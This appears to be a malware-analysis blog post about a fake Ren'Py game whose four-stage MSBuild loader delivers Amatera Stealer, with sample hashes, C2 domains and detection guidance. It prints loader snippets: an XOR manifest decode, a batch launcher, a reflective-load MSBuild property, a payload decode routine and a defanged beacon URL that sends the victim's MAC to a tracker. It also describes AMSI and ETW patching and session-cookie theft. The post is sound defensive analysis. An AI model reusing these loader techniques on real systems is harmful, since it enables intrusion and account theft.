---
title: "A payload that only decrypts with the file carrying it"
description: >-
  Pulling apart a fake game that turned out to be a four-stage loader for Amatera
  Stealer, and the carrier-keyed encoding that made the final payload impossible
  to extract without the exact bytes of its own MSBuild project.
pubDate: 2026-08-07
malwareFamily: Amatera Stealer
firstSeen: 2026-08-04
tags: ["malware-analysis", "dotnet", "msbuild", "loader", "amatera", "renpy"]
draft: false

samples:
  - name: "7Mmpw6GIH3zL.lc"
    sha256: "b0209a56237964228cbd95cfe7ee4c639e20da8bfb01bc19e84e43cb3d832c01"
    size: 20590711
    note: "XOR-encrypted ZIP container shipped in the game folder"
    url: "https://bazaar.abuse.ch/sample/b0209a56237964228cbd95cfe7ee4c639e20da8bfb01bc19e84e43cb3d832c01/"
  - name: "libwin64.rpa"
    sha256: "c4a461b72c5bfa08d4bffa4d10d265d3777efeb4066566442b11220cd48b88c6"
    size: 143789
    note: "Ren'Py archive carrying the trojanised script.rpyc"
    url: "https://bazaar.abuse.ch/sample/c4a461b72c5bfa08d4bffa4d10d265d3777efeb4066566442b11220cd48b88c6/"
  - name: "tIM9CNSIu.cmd"
    sha256: "36664f0225595e160bc93b3e3891cb84bcaa21fe1653e6485dea0a0bc3bed97e"
    size: 1181
    note: "MSBuild launcher; content randomised per victim, so this hash is one instance"
    url: "https://bazaar.abuse.ch/sample/36664f0225595e160bc93b3e3891cb84bcaa21fe1653e6485dea0a0bc3bed97e/"
  - name: "DocumentFormatOpenXml.csproj"
    sha256: "f31df9170d3d70c2e3a84e56f1dabe093f19c79013a4d741cda3697ab2a93eed"
    size: 9256933
    note: "Carrier project; holds the stage-4 assembly and is its own decryption key"
    url: "https://bazaar.abuse.ch/sample/f31df9170d3d70c2e3a84e56f1dabe093f19c79013a4d741cda3697ab2a93eed/"
  - name: "DocumentFormatOpenXml.Compile.targets"
    sha256: "ca31be1448cc15dfb3359f1ab1ba32cf6124fde5216457ca9fd03918892ec43b"
    size: 5980188
    note: "Holds the reflective-load property function and one hex fragment of stage 3"
    url: "https://bazaar.abuse.ch/sample/ca31be1448cc15dfb3359f1ab1ba32cf6124fde5216457ca9fd03918892ec43b/"
  - name: "loader_stage3.dll"
    sha256: "5fa116e699f23e230c6c17a47d499feae725069ec5186196df24a7346e0f77f5"
    size: 5662208
    note: "Reconstructed from MSBuild properties. Never exists on disk."
    url: "https://bazaar.abuse.ch/sample/5fa116e699f23e230c6c17a47d499feae725069ec5186196df24a7346e0f77f5/"
  - name: "WrickSpilth.dll"
    sha256: "a7e8bb5263b34be020d8b5c938b4c4187f390b9240f9ce757cae953da9988227"
    size: 3054080
    note: "Stage 4, recovered from the carrier project. Never exists on disk."
    url: "https://bazaar.abuse.ch/sample/a7e8bb5263b34be020d8b5c938b4c4187f390b9240f9ce757cae953da9988227/"

iocs:
  - { value: "prunarok.lol", type: "domain", note: "downloader C2" }
  - { value: "wuserrosok.cfd", type: "domain", note: "downloader C2" }
  - { value: "noabasteb.lol", type: "domain", note: "downloader C2" }
  - { value: "violcuglu.cfd", type: "domain", note: "downloader C2" }
  - { value: "frimwanbav.lol", type: "domain", note: "downloader C2" }
  - { value: "kefaisce.cfd", type: "domain", note: "downloader C2" }
  - { value: "feafetoboary.lol", type: "domain", note: "downloader C2" }
  - { value: "wuscokosh.cfd", type: "domain", note: "downloader C2" }
  - { value: "fleewakig.lol", type: "domain", note: "downloader C2" }
  - { value: "voskuzapoud.cfd", type: "domain", note: "downloader C2" }
  - { value: "spinbode.lol", type: "domain", note: "downloader C2" }
  - { value: "nujusnex.cfd", type: "domain", note: "downloader C2" }
  - { value: "freesilkirk.lol", type: "domain", note: "downloader C2" }
  - { value: "bairvitu.cfd", type: "domain", note: "downloader C2" }
  - { value: "loajituzio.lol", type: "domain", note: "downloader C2" }
  - {
      value: "pingtrack.click",
      type: "domain",
      note: "stage-1 install tracker; MAC address sent as a 12-hex subdomain. Observed live (HTTP 503).",
    }
  - {
      value: 'Global\SM0_16726_304_WilStaging_02',
      type: "mutex",
      note: "stage-4 single-instance marker",
    }
  - {
      value: '%LOCALAPPDATA%\Microsoft\Windows\Caches\cache.js',
      type: "path",
      note: "stage-4 module staging file (lzma+base64 inside a JSON cache structure)",
    }
  - {
      value: 'HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid',
      type: "registry",
      note: "read for host fingerprinting",
    }

references:
  - title: "Malwarebytes — Fake games spread stealers with RenPy Loader, MSBuild and EtherHiding"
    url: "https://www.malwarebytes.com/blog/threat-intel/2026/07/fake-games-spread-stealers-with-renpy-loader-msbuild-and-etherhiding"
  - title: "Proofpoint — Amatera Stealer: Rebranded ACR Stealer"
    url: "https://www.proofpoint.com/us/blog/threat-insight/amatera-stealer-rebranded-acr-stealer-improved-evasion-sophistication"
---

> **Has this happened to you?** This page is a technical teardown written for
> analysts. If you're here because your own accounts were stolen and you need to
> know what to do right now, read
> [the recovery guide](/help/hacked-account-recovery/) instead — it's written in
> plain English and ordered by what matters first.

A friend installed what he thought was an unreleased AAA game. It never drew a frame.
What it did instead was run a four-stage loader chain ending in Amatera Stealer, and
take his Microsoft account on the way through.

The chain itself is documented — Malwarebytes covered this campaign in July. What I
want to write about is the fourth stage, because the way it stores its payload is the
most elegant anti-analysis trick I've run into, and because I got it wrong the first
time in a way that's worth showing.

## The short version

```
Setup.exe (clean Ren'Py launcher)
  └── game/script.rpyc          init block, runs before the first frame
      └── 7Mmpw6GIH3zL.lc       XOR'd, password-protected ZIP, decrypted in memory
          └── tIM9CNSIu.cmd     MSBuild with property functions enabled
              └── .csproj       reflectively loads a 5.6 MB .NET assembly from build properties
                  └── stage 4   decoded from the .csproj itself, run in memory
                      └── Amatera Stealer, pulled over the network
```

Nothing malicious is ever written to disk as a `.dll` or an `.exe`. The only signed
binary in the process tree is Microsoft's own `MSBuild.exe`.

## Stage 1: the game

The package is a stock Ren'Py 8.1.3 game. `Setup.exe` is the unmodified Ren'Py launcher
shim, renamed — worth saying clearly, because it is a clean file and signaturing it would
flag every legitimate visual novel on Windows.

The malicious part is in `script.rpyc`, in an `init 1` block, which Ren'Py runs before
anything renders. The `splashscreen` label immediately calls `renpy.quit()`, so from the
user's side the game just fails to launch and they move on.

It reads a hidden manifest from the game directory — base64, then XOR with an ASCII key:

```python
secret = '81034149cd6f48c8821340204f92766e'.encode()
decrypted = bytes(b ^ secret[i % len(secret)] for i, b in enumerate(decoded))
```

```json
{
  "file_nm": "7Mmpw6GIH3zL.lc",
  "pasw": "YUIildEgd5B",
  "exc_fl": "tIM9CNSIu.cmd",
  "snd_bx": false,
  "pb_s": "A_TG3_eb9_p7_52",
  "hash": "817d99b3678c2341c6ca42729fa92586e3d113d98066db332ea312bedb5813f8..."
}
```

A few details worth noting in the dropper:

- Every extracted `.dll`, `.bat` and `.cmd` is written with a **random 2–3 character
  extension** and only renamed back moments before execution.
- A random `REM <uuid>` line is spliced into the scripts, so **every victim gets different
  file hashes**. Hash-based detection was never going to work here by design.
- It writes `:Zone.Identifier` alternate data streams with `ZoneId=0` to strip the
  Mark-of-the-Web and suppress SmartScreen.
- Execution goes through `forfiles.exe /p <dir> /m <file> /c "cmd /c call @path"`, so the
  parent process in telemetry is `forfiles.exe`, not the game.

There's also a bundled `sys_config` Python package that presents as an anti-VM engine.
It's rigged. The internet checks return a perfect score with the string "Internet checks
disabled", and `_check_specs()` computes disk, RAM and CPU-core results and then discards
them — only the model and manufacturer strings are actually weighed.

And a beacon, XOR-obfuscated with the key `cLkY_x9`:

```
hxxps://<victim-MAC-as-12-hex>[.]pingtrack[.]click/?id=<campaign>&data[hash]=<id>
```

The MAC address goes in the **subdomain**, so the identifier reaches the operator through
DNS resolution even if the HTTP request itself is blocked. My friend's Ren'Py log recorded
a 503 back from it, which makes this the one indicator in the whole set that I can say was
observed live rather than inferred from a binary.

## Stage 2: MSBuild as the execution engine

The container yields four files. The `.cmd` relaunches itself under
`conhost.exe --headless` so no window ever appears, then:

```bat
set MSBUILDENABLEALLPROPERTYFUNCTIONS=1
set "_xpey=%~dp0DocumentFormatOpenXml.csproj"
"%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" "…\DocumentFormatOpenXml.csproj" /nologo /v:q
```

The project files are padded with realistic build metadata. The live part is one property:

```xml
<RepositoryCommit>$(Product)$(AnalyzerConfigCache)$(GeneratedCodeCache)</RepositoryCommit>
<PackageOutputMetadata>DocumentFormat.OpenXml.Drawing.BaseDescriptor7</PackageOutputMetadata>

<NuGetAuditSuppress>$([System.AppDomain]::CurrentDomain.Load(
    $([System.Runtime.Remoting.Metadata.W3cXsd2001.SoapHexBinary]::Parse($(RepositoryCommit)).Value)
  ).CreateInstance($(PackageOutputMetadata)))</NuGetAuditSuppress>
```

A 5.6 MB hex string, split across three separate project files, concatenated by property
substitution and loaded straight into the MSBuild process. `CreateInstance` triggers the
type's static constructor. Classic `T1127.001`.

## Stage 3: a real library with one extra class

The stitched assembly is a genuine build of **DocumentFormat.OpenXml** with a single class
grafted in: `DocumentFormat.OpenXml.Drawing.BaseDescriptor7`. Its `.cctor` is marked
`[SecurityCritical]` and `[HandleProcessCorruptedStateExceptions]`, and runs on type load.

Strings are decoded through a bytecode VM driven by an embedded resource, identifiers are
single-use noise (`_fky`, `_ru`, `_msvu`, `_jaqw`). It installs an `UnhandledException`
handler that calls `Environment.Exit(0)` so the process dies quietly instead of producing a
crash dump. It blanks the process command line in the PEB via `Marshal.WriteInt16`, so
tooling reading arguments sees nothing.

Then it reads the project path back out of the `_xpey` environment variable, and does
something that took me a while to appreciate: **it deletes the `.csproj`, clears `_xpey`,
and wipes every other environment variable matching `_[a-z]{1,7}`.**

At the time I read that as ordinary cleanup. It isn't.

## Stage 4: the payload is keyed to its own carrier

Between two `[Emit-58868daf-402c-ced0-3671-72d07b02f459]` markers, the `.csproj` holds
3,054,080 comma-separated integers. The first few:

```
2749, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0, 184, 0, 0, 0, …
```

That is _almost_ a DOS header. `90, 144, 0, 3, …` is exactly `5A 90 00 03 …`. But the
first value is 2749, not 77, and about one value in six is above 255.

Here's what the loader actually does:

```python
table   = bytes(range(256)) + open('DocumentFormatOpenXml.csproj', 'rb').read()
payload = bytes(table[v] for v in values)
```

Values 0–255 index the identity prefix and decode to themselves. The 500,131 values above
255 are **back-references into the carrier file's own XML preamble**. `2749` resolves to
`csproj[2493]`, which is the `M` in a comment near the top of the file.

So the payload is not encrypted with a key. It is encrypted _with the file that contains
it_. Change a byte of that XML, reformat it, let an editor normalise the line endings, and
16% of the payload is destroyed. Which is why the loader deletes the `.csproj` the instant
it has finished reading it — the key deletes itself, and if you turn up afterwards with
only the dropped files, there is nothing to recover.

The result is a clean PE32+ .NET assembly, 3,054,080 bytes, `BSJB` metadata intact, last
section ending exactly at EOF.

## The part I got wrong

My first attempt at this was to mask everything with `& 0xFF`, scan for `MZ`, and cut from
there:

```python
byte_array = bytearray(v & 0xFF for v in raw_numbers)
mz_offset = byte_array.find(b'MZ')
final_payload = byte_array[mz_offset:]
```

That produced a 2,137,560-byte file starting with `MZ`, which looked enough like a result
that I moved on and started analysing it.

It was garbage. The `MZ` was a coincidental two-byte match at offset 916,520, `e_lfanew`
pointed past the end of the buffer, and the file contained no `PE\0\0` signature anywhere.
Masking discards exactly the bit that distinguishes a literal from a back-reference, so one
byte in six was wrong — enough to destroy the file, not enough to be obvious.

The check that would have caught it immediately is about five lines:

```python
e_lfanew = struct.unpack_from('<I', blob, 0x3C)[0]
assert blob[:2] == b'MZ'
assert blob[e_lfanew:e_lfanew+4] == b'PE\0\0'          # ← fails instantly
assert last_section_raw_offset + raw_size == len(blob)  # ← no slack at EOF
```

I now treat this as the rule: **never believe your own extraction until something
structural confirms it.** Every decode, decrypt or carve should end with a cheap oracle
that says "this really is what I think it is." Finding `MZ` is not that oracle. A parseable
PE with coherent section geometry is.

## What stage 4 does

`WrickSpilth.dll` is a downloader and access broker, not the stealer itself. Every string
literal is AES-encrypted and identifiers are renamed from a plausible-vocabulary dictionary
(`NetworkTree`, `DockingPaneLoader`). A second, weaker layer — UTF-16 strings XORed with a
single byte, stored across 1,710 explicit-layout structs — gave up 562 plaintext strings,
which together with the metadata tables is enough to characterise it:

- **AMSI patching** — `AmsiScanBuffer`, `System.Management.Automation.AmsiUtils`,
  `amsiContext`, paired with `VirtualProtect` and `FlushInstructionCache`
- **ETW blinding** — `EtwEventWrite` through the same primitives
- **Anti-debug** — `NtQueryInformationProcess`, `NtSetInformationThread`, `NtGlobalFlag`,
  `CloseHandle` exception probing, vectored exception handlers
- **EDR hook detection** — reads `.text`/`.rdata` of loaded modules and diffs them against a
  clean snapshot before running
- **Shellcode primitives** — the entire P/Invoke set is `VirtualAlloc`, `VirtualProtect`,
  `VirtualFree`, `VirtualLock`, `VirtualUnlock`, `VirtualQuery`, `RtlZeroMemory`
- **C2** — ECDH over a named curve, AES-CBC, HMAC-SHA256, over `TcpClient` + `SslStream`
  with a permissive certificate callback. Requests carry `X-Timestamp`, `X-Nonce`,
  `X-Signature`. Eight rotating browser User-Agents.
- **DNS-over-HTTPS** for its own resolution, so local DNS logging sees nothing
- **EtherHiding** — `eth_call` and `eth_blockNumber`; if every hardcoded domain is dead, the
  current C2 is read from an Ethereum smart contract. Sinkholing the domains does not close
  the channel.

There's also a complete decoy WinForms app in there — "VaultLibrary Pro v2.1.0, Advanced
Media Management System", with fake playlists and sample media. Cover for anyone who opens
the assembly and glances at it.

Notably **absent**: any browser, wallet or credential paths. Stage 4 fingerprints the host,
establishes the channel, and pulls modules in on demand. The actual theft is done by
Amatera, which arrives over the network and is not present in the files at all.

## What Amatera takes once it lands

Stage 4 pulls it over the network, so it isn't in this sample set and none of the
below is my analysis — it's from Proofpoint's write-up of the family. Worth stating
plainly, because "an info-stealer" undersells the blast radius and people
consistently under-scope their clean-up as a result:

- **Saved browser passwords**, web-form data and profile history, from every
  Chromium-based browser and Firefox
- **Session cookies** — the ones that make MFA irrelevant, as below
- **Password manager browser extensions** — the extension's own files on disk
- **Cryptocurrency** — software wallet files and wallet browser extensions
- **Messaging apps** — Signal, WhatsApp and XMPP desktop clients
- **Email clients**, and connection managers holding **SSH and FTP credentials**
- **Arbitrary files**, selected by operator-configured extensions and keywords

The App-Bound Encryption bypass is the mechanism behind most of that: it injects
shellcode into the browser and has the browser decrypt and copy out its own
protected files. Cookies and saved passwords come out through the same door.
Exfiltration is a POST to the hardcoded C2, base64 and XOR encoded.

The practical consequence: everything typed into or saved by that browser should be
considered attacker-owned, not just whatever you happened to be logged into.

## How the Microsoft account went

Amatera bypasses Chrome/Edge App-Bound Encryption by injecting shellcode into the browser
and having it decrypt and copy out its own cookie store. Edge on Windows is signed into the
Microsoft account by default.

So the account went via **session cookie theft, not password theft**. The attacker imported
the `login.live.com` cookies and landed in an already-authenticated session. MFA never
fired, because MFA protects the login, not the session that follows it.

Full remediation steps are in [the recovery guide](/help/hacked-account-recovery/). The
short version, if you're helping someone clean up: changing the password does
not evict them. You have to revoke sessions — "sign out everywhere" — and you have to do it
from a clean device with the infected machine already off the network, or the new session
gets stolen too. And check the account's recovery methods afterwards; attackers add their
own, which is how accounts get re-stolen a week after a "successful" recovery.

## Detection

Hashes are close to useless here — the dropper randomises them per victim on purpose.
Behaviour is what's left:

- `MSBuild.exe` with a `cmd.exe`/`conhost.exe` parent and no Visual Studio or build-agent
  ancestry, especially with `MSBUILDENABLEALLPROPERTYFUNCTIONS=1` in the environment
- `forfiles.exe … /c "cmd /c call @path"` anywhere outside admin scripting
- `conhost.exe --headless` spawning `cmd.exe`
- A game or `python.exe` process writing to `Downloads\tmp-#####-*` and then executing from it
- Writes to `:Zone.Identifier` streams containing `ZoneId=0`
- A 12-hex-character subdomain under `pingtrack[.]click` in DNS or proxy logs

The extractor I wrote for the stage-4 encoding is pure data reconstruction — it never
loads or executes the assembly, which matters, because the loader's static constructor
fires on type resolution and will run if you so much as `Assembly.LoadFrom` it. The YARA
rules key on the MSBuild carrier and the launcher script rather than on hashes, for the
reason above.

Samples are on MalwareBazaar; the C2 domains and the tracker went to ThreatFox. If you're
looking at the same campaign, the infrastructure here doesn't overlap with what Malwarebytes
published in July, so there's more than one wave running.
